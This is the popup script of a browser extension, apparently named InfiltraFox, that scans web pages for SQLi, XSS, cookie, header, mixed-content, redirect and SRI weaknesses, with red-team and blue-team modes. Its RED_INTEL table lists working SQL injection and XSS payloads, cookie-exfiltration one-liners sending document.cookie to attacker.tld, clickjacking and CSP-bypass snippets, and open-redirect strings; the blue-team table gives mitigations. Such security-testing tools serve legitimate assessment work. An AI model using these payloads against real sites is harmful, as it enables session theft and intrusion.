/**
 * InfiltraFox - Popup Script v1.2
 */

// ── DOM refs ──────────────────────────────────────────────────────────────────
const redTeamBtn       = document.getElementById('redTeamBtn');
const blueTeamBtn      = document.getElementById('blueTeamBtn');
const scanButton       = document.getElementById('scanButton');
const loadingIndicator = document.getElementById('loadingIndicator');
const resultsContainer = document.getElementById('resultsContainer');
const errorMessage     = document.getElementById('errorMessage');
const exportButton     = document.getElementById('exportButton');
const pageTitle        = document.getElementById('pageTitle');
const pageUrl          = document.getElementById('pageUrl');
const scanTimestamp    = document.getElementById('scanTimestamp');
const summaryStats     = document.getElementById('summaryStats');
const riskBarFill      = document.getElementById('riskBarFill');
const riskScoreValue   = document.getElementById('riskScoreValue');

const TAB_CONFIG = [
  ['sqli',      'sqliBadge',      'sqliContent',      'No SQL injection indicators detected.'],
  ['xss',       'xssBadge',       'xssContent',       'No XSS indicators detected.'],
  ['cookies',   'cookiesBadge',   'cookiesContent',   'No JavaScript-accessible cookies detected.'],
  ['headers',   'headersBadge',   'headersContent',   'No security header issues detected via meta tags.'],
  ['mixed',     'mixedBadge',     'mixedContent',     'No mixed content detected.'],
  ['redirects', 'redirectsBadge', 'redirectsContent', 'No open redirect indicators detected.'],
  ['sri',       'sriBadge',       'sriContent',       'No SRI issues detected.']
];

const SEVERITY_WEIGHT = { critical: 10, high: 6, medium: 3, low: 1 };
const RISK_MAX = 40;

let currentMode   = 'redTeam';
let currentRecord = null;

// ── Red-team attack intelligence ──────────────────────────────────────────────
// Each entry: { summary, payloads[], refs[{ label, url }] }
const RED_INTEL = {
  sqli: {
    summary: "Probe each input systematically. Error-based SQLi leaks DB info in responses; boolean-blind and time-based variants work when errors are suppressed. Absent CSRF tokens allow remote form submission from any attacker-controlled page.",
    payloads: [
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'--",
      "' UNION SELECT null,null,null--",
      "1; WAITFOR DELAY '0:0:5'--",
      "' AND SLEEP(5)--",
      "' OR 1=1 LIMIT 1 OFFSET 1--"
    ],
    refs: [
      { label: "CWE-89", url: "https://cwe.mitre.org/data/definitions/89.html" },
      { label: "OWASP SQLi", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
      { label: "PortSwigger Labs", url: "https://portswigger.net/web-security/sql-injection" }
    ]
  },
  xss: {
    summary: "Confirm whether user-controlled input (URL params, fragment, localStorage) flows into the detected sink unsanitized. DOM-based XSS often bypasses server-side WAFs entirely. Use browser devtools to trace the data flow before crafting payloads.",
    payloads: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(document.domain)>",
      "<svg/onload=alert(1)>",
      "javascript:alert(1)",
      "'><script>fetch('https://attacker.tld/?c='+document.cookie)</script>",
      "\"><img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">",
      "<details open ontoggle=alert(1)>"
    ],
    refs: [
      { label: "CWE-79", url: "https://cwe.mitre.org/data/definitions/79.html" },
      { label: "PortSwigger XSS", url: "https://portswigger.net/web-security/cross-site-scripting" },
      { label: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" },
      { label: "DOM XSS Wiki", url: "https://github.com/wisec/domxsswiki" }
    ]
  },
  cookies: {
    summary: "JS-accessible cookies can be exfiltrated after any XSS. Validate whether cookie names suggest session tokens (PHPSESSID, JSESSIONID, auth_token, etc.) — these are high-value targets. On HTTP pages, cookies are also visible to a passive network observer.",
    payloads: [
      "fetch('https://attacker.tld/?c='+document.cookie)",
      "new Image().src='https://attacker.tld/?c='+encodeURIComponent(document.cookie)",
      "navigator.sendBeacon('https://attacker.tld/',document.cookie)"
    ],
    refs: [
      { label: "CWE-1004", url: "https://cwe.mitre.org/data/definitions/1004.html" },
      { label: "OWASP Session Mgmt", url: "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" },
      { label: "PortSwigger Cookies", url: "https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions" }
    ]
  },
  headers: {
    summary: "Missing security headers amplify other vulnerabilities. No CSP makes XSS easier to exploit. No X-Frame-Options enables clickjacking — useful for tricking users into submitting forms or clicking buttons. Chain with CSRF for higher-impact bugs.",
    payloads: [
      "<!-- Clickjacking PoC -->",
      "<iframe src='https://TARGET' style='opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%;'></iframe>",
      "<!-- CSP bypass via JSONP endpoint -->",
      "<script src='https://TARGET/api/jsonp?callback=alert(1)//></script>"
    ],
    refs: [
      { label: "CWE-693", url: "https://cwe.mitre.org/data/definitions/693.html" },
      { label: "OWASP Clickjacking", url: "https://owasp.org/www-community/attacks/Clickjacking" },
      { label: "CSP Evaluator", url: "https://csp-evaluator.withgoogle.com/" },
      { label: "OWASP Secure Headers", url: "https://owasp.org/www-project-secure-headers/" }
    ]
  },
  mixed: {
    summary: "Mixed active content (scripts, iframes, forms) over HTTP on an HTTPS page can be intercepted by a network MITM. Downgrade or intercept the HTTP sub-resource to inject arbitrary JS into the HTTPS context — bypasses TLS protection entirely.",
    payloads: [
      "// ARP-spoof or rogue AP, intercept HTTP resource, inject:",
      "<script>document.cookie='session=STOLEN'; location='https://attacker.tld'</script>",
      "// Or intercept the stylesheet to exfil via CSS attribute selectors"
    ],
    refs: [
      { label: "CWE-319", url: "https://cwe.mitre.org/data/definitions/319.html" },
      { label: "MDN Mixed Content", url: "https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" },
      { label: "PortSwigger MITM", url: "https://portswigger.net/web-security/host-header/exploiting" }
    ]
  },
  redirects: {
    summary: "Test whether the redirect destination is validated server-side. Unvalidated redirects are used for phishing (trusted domain → attacker site), OAuth token theft (redirect_uri manipulation), and SSRF in some server-side proxy patterns.",
    payloads: [
      "?redirect=https://attacker.tld",
      "?next=//attacker.tld/%2F..",
      "?url=https:attacker.tld",
      "?return=javascript:alert(1)",
      "?goto=%0d%0aLocation:%20https://attacker.tld",
      "?redirect=https://trusted.tld@attacker.tld"
    ],
    refs: [
      { label: "CWE-601", url: "https://cwe.mitre.org/data/definitions/601.html" },
      { label: "PortSwigger Open Redirect", url: "https://portswigger.net/kb/issues/00500100_open-redirection-reflected" },
      { label: "HackerOne Reports", url: "https://hackerone.com/hacktivity?querystring=open%20redirect" },
      { label: "OAuth redirect_uri", url: "https://portswigger.net/web-security/oauth#flawed-redirect-uri-validation" }
    ]
  },
  sri: {
    summary: "External scripts without SRI hashes trust the CDN completely. A supply-chain compromise (CDN breach, BGP hijack, DNS poisoning) lets an attacker serve a modified version of the library to all users — effectively site-wide XSS with no interaction required.",
    payloads: [
      "// Confirm the CDN domain, then check:",
      "// 1. Known breaches: search '{cdn-domain} breach' / '{lib-name} supply chain'",
      "// 2. Check if the CDN URL resolves to the same org",
      "// 3. Test: modify the hosted file — does the browser accept it?"
    ],
    refs: [
      { label: "CWE-829", url: "https://cwe.mitre.org/data/definitions/829.html" },
      { label: "MDN SRI", url: "https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" },
      { label: "SRI Hash Generator", url: "https://www.srihash.org/" },
      { label: "OWASP Supply Chain", url: "https://owasp.org/www-project-dependency-check/" }
    ]
  }
};

const BLUE_RECS = {
  sqli:      'Use parameterized queries / prepared statements for all DB access. Add server-side input validation and length limits. Require CSRF tokens on every state-changing request.',
  xss:       'Remove inline event handlers. Avoid unsafe DOM sinks (innerHTML, eval, document.write). Apply context-aware output encoding and enforce a strict Content-Security-Policy with nonces.',
  cookies:   'Set HttpOnly on all cookies that do not need JS access. Add Secure on HTTPS-only flows. Set SameSite=Lax (or Strict for sensitive cookies). Rotate session tokens on privilege change.',
  headers:   'Serve missing headers as HTTP response headers (preferred over meta tags). Use OWASP Secure Headers Project values as a baseline. Run https://securityheaders.com to verify.',
  mixed:     'Update all sub-resource URLs to HTTPS. Add upgrade-insecure-requests to your CSP. Enable HSTS with a long max-age and includeSubDomains.',
  redirects: 'Validate redirect destinations against a server-side allowlist of trusted origins. Reject absolute URLs that are not in the allowlist. Use relative paths where possible.',
  sri:       'Add integrity="sha384-…" and crossorigin="anonymous" to every external <script> and <link rel="stylesheet">. Use https://www.srihash.org to generate hashes. Pin versions, do not use @latest CDN URLs.'
};

// ── Init ──────────────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', async () => {
  try {
    const state = await browser.runtime.sendMessage({ action: 'getLastResults' });
    currentMode = state?.analysisMode || 'redTeam';
    updateUIForMode(currentMode);
    if (state?.record) {
      currentRecord = state.record;
      displayResults(currentRecord);
    }
  } catch (e) {
    showError(`Unable to load extension state: ${e.message}`);
  }
});

// ── Mode toggle ───────────────────────────────────────────────────────────────
redTeamBtn.addEventListener('click',  () => { if (currentMode !== 'redTeam')  setAnalysisMode('redTeam'); });
blueTeamBtn.addEventListener('click', () => { if (currentMode !== 'blueTeam') setAnalysisMode('blueTeam'); });

async function setAnalysisMode(mode) {
  currentMode = mode;
  updateUIForMode(mode);
  try {
    const res = await browser.runtime.sendMessage({ action: 'setAnalysisMode', mode });
    if (res?.mode) { currentMode = res.mode; updateUIForMode(currentMode); }
  } catch (e) {
    showError(`Unable to switch mode: ${e.message}`);
  }
}

function updateUIForMode(mode) {
  const isRed = mode === 'redTeam';
  redTeamBtn.classList.toggle('active', isRed);
  blueTeamBtn.classList.toggle('active', !isRed);
  scanButton.classList.toggle('blue-mode', !isRed);
  document.querySelectorAll('.tab.active').forEach(t => t.classList.toggle('blue-mode', !isRed));
  if (currentRecord) displayResults(currentRecord);
}

// ── Scan ──────────────────────────────────────────────────────────────────────
scanButton.addEventListener('click', async () => {
  scanButton.disabled = true;
  loadingIndicator.style.display = 'block';
  resultsContainer.style.display = 'none';
  hideError();

  try {
    const res = await browser.runtime.sendMessage({ action: 'startAnalysis' });
    if (!res?.success || !res.record) {
      showError(`Analysis failed: ${res?.error || 'Unknown error'}`);
      return;
    }
    currentRecord = res.record;
    displayResults(currentRecord);
  } catch (e) {
    showError(`Unable to start analysis: ${e.message}`);
  } finally {
    scanButton.disabled = false;
    loadingIndicator.style.display = 'none';
  }
});

// ── Tabs ──────────────────────────────────────────────────────────────────────
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active', 'blue-mode'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    tab.classList.add('active');
    if (currentMode === 'blueTeam') tab.classList.add('blue-mode');
    document.getElementById(`${tab.dataset.tab}Content`).classList.add('active');
  });
});

// ── Export ────────────────────────────────────────────────────────────────────
exportButton.addEventListener('click', () => {
  if (!currentRecord) return;
  const blob = new Blob([JSON.stringify({
    timestamp: currentRecord.timestamp,
    url:       currentRecord.url,
    title:     currentRecord.title,
    mode:      currentMode,
    findings:  currentRecord.results
  }, null, 2)], { type: 'application/json' });

  const url  = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href     = url;
  link.download = `infiltrafox-report-${currentRecord.timestamp.slice(0, 10)}.json`;
  document.body.appendChild(link);
  link.click();
  setTimeout(() => { document.body.removeChild(link); URL.revokeObjectURL(url); }, 0);
});

// ── Display results ───────────────────────────────────────────────────────────
function displayResults(record) {
  const r = record.results;
  hideError();

  pageTitle.textContent     = record.title || r.meta?.title || 'Untitled Page';
  pageUrl.textContent       = record.url;
  pageUrl.title             = record.url;
  scanTimestamp.textContent = formatTimestamp(record.timestamp);
  summaryStats.textContent  = [
    `${r.meta?.forms ?? 0} forms`,
    `${r.meta?.scripts ?? 0} scripts`,
    `${r.meta?.cookieCount ?? 0} readable cookies`
  ].join(' · ');

  const dataMap = {
    sqli:      r.sqli           || [],
    xss:       r.xss            || [],
    cookies:   r.cookies        || [],
    headers:   r.headers        || [],
    mixed:     r.mixedContent   || [],
    redirects: r.openRedirects  || [],
    sri:       r.sri            || []
  };

  TAB_CONFIG.forEach(([key, badgeId, contentId, emptyText]) => {
    const findings  = dataMap[key];
    const badge     = document.getElementById(badgeId);
    const container = document.getElementById(contentId);

    badge.textContent = String(findings.length);
    badge.className   = `badge ${findings.length ? getHighestSeverity(findings) : 'none'}`;

    container.replaceChildren();
    if (!findings.length) {
      const msg = document.createElement('div');
      msg.className   = 'no-findings';
      msg.textContent = emptyText;
      container.appendChild(msg);
    } else {
      findings.forEach((f, i) => container.appendChild(createFindingEl(key, f, i)));
    }
  });

  // Risk score
  const score = Object.values(dataMap).flat().reduce((sum, f) =>
    sum + (SEVERITY_WEIGHT[String(f.riskLevel || 'low').toLowerCase()] || 1), 0);
  const pct = Math.min(100, Math.round((score / RISK_MAX) * 100));
  riskBarFill.style.width      = `${pct}%`;
  riskBarFill.style.background = pct >= 75 ? '#d32f2f' : pct >= 45 ? '#f57c00' : pct >= 20 ? '#ffb74d' : '#66bb6a';
  riskScoreValue.textContent   = `${score} / ${RISK_MAX}+`;
  riskScoreValue.style.color   = pct >= 75 ? '#ef5350' : pct >= 45 ? '#ffb74d' : '#66bb6a';

  resultsContainer.style.display = 'block';
}

// ── Finding element factory ───────────────────────────────────────────────────
function createFindingEl(type, finding, index) {
  const risk = String(finding.riskLevel || 'low').toLowerCase();

  const el = document.createElement('div');
  el.className = 'finding';
  el.style.borderLeftColor =
    risk === 'critical' ? '#b71c1c' :
    risk === 'high'     ? '#e53935' :
    risk === 'medium'   ? '#f57c00' : '#f9a825';

  // ── Collapsed header (click target) ──
  const header = document.createElement('div');
  header.className = 'finding-header';

  const titleEl = document.createElement('div');
  titleEl.className   = 'finding-title';
  titleEl.textContent = getFindingTitle(type, finding, index);

  const pill = document.createElement('div');
  pill.className   = `risk-pill ${risk}`;
  pill.textContent = finding.riskLevel;

  const chevron = document.createElement('span');
  chevron.className   = 'finding-chevron';
  chevron.textContent = '▶';

  header.append(titleEl, pill, chevron);

  // ── Expandable body ──
  const body = document.createElement('div');
  body.className = 'finding-body';

  const details = document.createElement('div');
  details.className = 'finding-details';
  buildDetails(details, type, finding);
  body.appendChild(details);

  body.appendChild(
    currentMode === 'redTeam' ? buildAttackCard(type) : buildBlueRec(type)
  );

  // ── Accordion toggle ──
  header.addEventListener('click', () => {
    const isOpen = el.classList.contains('open');
    // Close all siblings in the same tab-content
    el.closest('.tab-content')?.querySelectorAll('.finding.open').forEach(f => f.classList.remove('open'));
    if (!isOpen) el.classList.add('open');
  });

  el.append(header, body);
  return el;
}

function getFindingTitle(type, finding, index) {
  switch (type) {
    case 'sqli':      return `Potential SQLi in ${finding.formId ? `#${finding.formId}` : `form ${index + 1}`}`;
    case 'xss':       return `XSS vector: ${finding.type}`;
    case 'cookies':   return `Cookie exposed to JS: ${finding.name}`;
    case 'headers':   return `Missing / weak header: ${finding.header}`;
    case 'mixed':     return `Mixed content (${finding.type})`;
    case 'redirects': return `Open redirect parameter`;
    case 'sri':       return `Missing SRI on external ${finding.tagType}`;
    default:          return `Finding ${index + 1}`;
  }
}

function buildDetails(container, type, finding) {
  const rows = [];

  if (type === 'sqli') {
    rows.push(['Method',           finding.method || (finding.isPostMethod ? 'POST' : 'GET')]);
    rows.push(['Password field',   finding.hasPasswordField ? 'Yes' : 'No']);
    rows.push(['CSRF token',       finding.hasNoCSRFToken   ? 'Missing' : 'Present']);
    rows.push(['Action',           finding.formAction || 'Current page']);
    rows.push(['Unsafe inputs',    String(finding.unsafeInputs?.length ?? 0)]);
    rows.forEach(([l, v]) => container.appendChild(detailRow(l, v)));
    finding.unsafeInputs?.forEach(i =>
      container.appendChild(codeSnippet(`${i.inputName || i.inputId || 'unnamed'} (${i.inputType})`))
    );
    return;
  }

  if (type === 'xss') {
    rows.push(['Location', finding.location || 'Unknown']);
    if (finding.element)   rows.push(['Element',   finding.element]);
    if (finding.attribute) rows.push(['Attribute', finding.attribute]);
    rows.forEach(([l, v]) => container.appendChild(detailRow(l, v)));
    container.appendChild(codeSnippet(finding.content || ''));
    return;
  }

  if (type === 'cookies') {
    rows.push(['JS accessible', 'Yes']);
    rows.push(['HttpOnly',      'No']);
    rows.push(['Secure',        formatFlag(finding.flags?.secure)]);
    rows.push(['SameSite',      formatFlag(finding.flags?.sameSite)]);
    rows.forEach(([l, v]) => container.appendChild(detailRow(l, v)));
    container.appendChild(codeSnippet(finding.details || ''));
    return;
  }

  if (type === 'headers') {
    rows.push(['Present', finding.present ? 'Yes (weak)' : 'No']);
    if (finding.value) rows.push(['Value', finding.value]);
    rows.forEach(([l, v]) => container.appendChild(detailRow(l, v)));
    container.appendChild(codeSnippet(finding.details || ''));
    return;
  }

  if (type === 'mixed') {
    rows.push(['Content type', finding.type]);
    rows.push(['Location',     finding.location]);
    rows.forEach(([l, v]) => container.appendChild(detailRow(l, v)));
    container.appendChild(codeSnippet(finding.url || ''));
    return;
  }

  if (type === 'redirects') {
    rows.push(['Location',        finding.location]);
    rows.push(['Redirect params', finding.params]);
    rows.forEach(([l, v]) => container.appendChild(detailRow(l, v)));
    container.appendChild(codeSnippet(finding.url || ''));
    return;
  }

  // sri
  rows.push(['Tag type', finding.tagType]);
  rows.push(['Location', finding.location]);
  rows.forEach(([l, v]) => container.appendChild(detailRow(l, v)));
  container.appendChild(codeSnippet(finding.src || ''));
}

// ── Attack card (Red Team) ────────────────────────────────────────────────────
function buildAttackCard(type) {
  const intel = RED_INTEL[type];
  if (!intel) return document.createTextNode('');

  const card = document.createElement('div');
  card.className = 'attack-card';

  const label = document.createElement('div');
  label.className   = 'attack-card-label';
  label.textContent = '⚔ Attack Vectors';
  card.appendChild(label);

  const summary = document.createElement('p');
  summary.textContent = intel.summary;
  card.appendChild(summary);

  if (intel.payloads?.length) {
    const payloadLabel = document.createElement('div');
    payloadLabel.className   = 'attack-card-label';
    payloadLabel.textContent = 'Payloads / Techniques';
    payloadLabel.style.marginTop = '8px';
    card.appendChild(payloadLabel);

    const ul = document.createElement('ul');
    ul.className = 'payload-list';
    intel.payloads.forEach(p => {
      const li = document.createElement('li');
      li.textContent = p;
      ul.appendChild(li);
    });
    card.appendChild(ul);
  }

  if (intel.refs?.length) {
    const refLabel = document.createElement('div');
    refLabel.className   = 'attack-card-label';
    refLabel.textContent = 'References';
    refLabel.style.marginTop = '8px';
    card.appendChild(refLabel);

    const refList = document.createElement('div');
    refList.className = 'ref-list';
    intel.refs.forEach(({ label: text, url }) => {
      const a = document.createElement('a');
      a.className   = 'ref-link';
      a.textContent = text;
      a.title       = url;
      a.href        = url;
      a.target      = '_blank';
      a.rel         = 'noopener noreferrer';
      refList.appendChild(a);
    });
    card.appendChild(refList);
  }

  return card;
}

// ── Blue team recommendation ──────────────────────────────────────────────────
function buildBlueRec(type) {
  const wrapper = document.createElement('div');
  wrapper.className = 'recommendation';

  const label = document.createElement('div');
  label.className   = 'recommendation-label';
  label.textContent = '🛡 Mitigation';
  wrapper.appendChild(label);

  const text = document.createElement('div');
  text.textContent = BLUE_RECS[type] || 'Apply defence-in-depth controls for this finding category.';
  wrapper.appendChild(text);

  return wrapper;
}

// ── Helpers ───────────────────────────────────────────────────────────────────
function detailRow(label, value) {
  const row = document.createElement('div');
  const b   = document.createElement('strong');
  b.textContent = `${label}: `;
  row.append(b, document.createTextNode(value));
  return row;
}

function codeSnippet(content) {
  const el = document.createElement('div');
  el.className   = 'code-snippet';
  el.textContent = content;
  return el;
}

function getHighestSeverity(findings) {
  const order = { critical: 4, high: 3, medium: 2, low: 1 };
  return findings.reduce((best, f) => {
    const s = String(f.riskLevel || 'low').toLowerCase();
    return (order[s] || 0) > (order[best] || 0) ? s : best;
  }, 'low');
}

function formatFlag(v) {
  return v === true ? 'Yes' : v === false ? 'No' : 'Unknown';
}

function formatTimestamp(v) {
  try { return new Date(v).toLocaleString(); } catch (_) { return v; }
}

function showError(msg) {
  errorMessage.textContent   = msg;
  errorMessage.style.display = 'block';
}

function hideError() {
  errorMessage.style.display = 'none';
  errorMessage.textContent   = '';
}
